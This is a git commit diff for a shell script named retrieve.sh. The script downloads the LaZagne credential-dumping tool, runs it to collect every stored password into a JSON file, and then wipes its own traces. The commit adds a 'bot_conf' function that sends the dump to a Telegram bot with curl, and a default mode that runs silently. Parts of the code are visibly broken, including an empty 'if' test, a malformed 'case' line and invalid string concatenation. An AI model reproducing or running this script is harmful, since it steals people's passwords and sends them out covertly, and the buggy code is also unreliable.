7b975d3000f067fafce72e8ae96281c0b08ecff5
Code Lao <arsezsoftware@gmail.com>
2024-07-15 11:41:26 -0500

    Added send to Telegram function (alpha). Minor improvements and bug fixes.

--- Passwords-Retrieve/Unix/retrieve.sh
+++ Passwords-Retrieve/Unix/retrieve.sh
@@ -5,81 +5,65 @@
 
 
 payload() {
-    if [ "$1" == "verbose" ]; then
-        printf "\033[33m[*]\033[0m Preparing payload...\n"
-    fi
+    printf "\033[33m[*]\033[0m Preparing payload...\n"
     if ! git --version; then
-        if [ "$1" == "verbose" ]; then
-            printf "\033[31m[*]\033[0m Git not installed.\n"
-        else
-            clear
-        fi
+        printf "\033[31m[*]\033[0m Git not installed.\n"
         exit 1
     else
-        if ! pip3 --version; then
-            if [ "$1" == "verbose" ]; then
-                printf "\033[31m[*]\033[0m Pip3 not installed.\n"
-            else
-                clear
-            fi
+        if ! pip3 --version && ! pip --version; then
+            printf "\033[31m[*]\033[0m Pip not installed.\n"
             exit 1
         else
-            if [ "$1" == "verbose" ]; then
-                printf "\033[33m[*]\033[0m Downloading LaZagne...\n"
-            else
-                clear
-            fi
+            printf "\033[33m[*]\033[0m Downloading LaZagne...\n"
             cd $HOME
             if ! git clone https://github.com/AlessandroZ/LaZagne; then
-                if [ "$1" == "verbose" ]; then
-                    printf "\033[31m[*]\033[0m Unable to download LaZagne.\n"
-                else
-                    clear
-                fi
+                printf "\033[31m[*]\033[0m Unable to download LaZagne.\n"
                 exit 1
             else
-                if [ "$1" == "verbose" ]; then
-                    printf "\033[33m[*]\033[0m Preparing to run scripts...\n"
-                else
-                    clear
+                printf "\033[33m[*]\033[0m Preparing to run scripts...\n"
+                if ! pip3 install -r LaZagne/requirements.txt; then
+                    pip install -r LaZagne/requirements.txt
                 fi
-                pip3 install -r LaZagne/requirements.txt
-                if [ "$1" == "verbose" ]; then
-                    printf "\033[33m[*]\033[0m Running scripts...\n"
-                else
-                    clear
-                fi
+                printf "\033[33m[*]\033[0m Running scripts...\n"
                 python3 LaZagne/Mac/laZagne.py all -oJ -output $HOME/Desktop
-                # # #
-                if [ "$1" == "verbose" ]; then
-                    printf "\033[33m[*]\033[0m Removing files...\n"
-                else
-                    clear
+                if [  ]; then
+                    printf "\033[33m[*]\033[0m Sending data to selected Telegram chat...\n"
+                    if ! bot_conf; then
+                        printf "\033[31m[*]\033\0m Cannot send data to selected Telegram chat.\n"
+                    fi
+                    printf "\033[33m[*]\033[0m Removing LaZagne output...\n"
+                    shred --remove --zero -n 1 # filename
                 fi
+                printf "\033[33m[*]\033[0m Cleaning up files...\n"
                 rm -rf LaZagne
-                if [ "$1" == "verbose" ]; then
-                    printf "\033[32m[*]\033[0m Done.\n"
-                else
-                    clear
-                fi
-                exit 0
+                printf "\033[32m[*]\033[0m Done.\n"
             fi
         fi
     fi
 }
 
+bot_conf() {
+    token=""
+    id=""
+    bot_api="https://api.telegram.org/bot"+$token+"/sendDocument"
+    doc="@$HOME/Desktop/test.json"
 
-case "$1" in
+    curl -X POST $bot_api \
+    -F chat_id=$id \
+    -F document=$doc
+}
+
+
+case "$1" or "$2" in
     "verbose" )
         payload
-        ;;
-    "token" )
-        payload
-        ;;
+        exit 0
     "" )
-        payload
+        payload > /dev/null 2>&1
+        exit 0
         ;;
     * )
         printf "\033[31m[*]\033[0m Invalid argument(s) specified.\n"
         exit 1
+        ;;
 esac
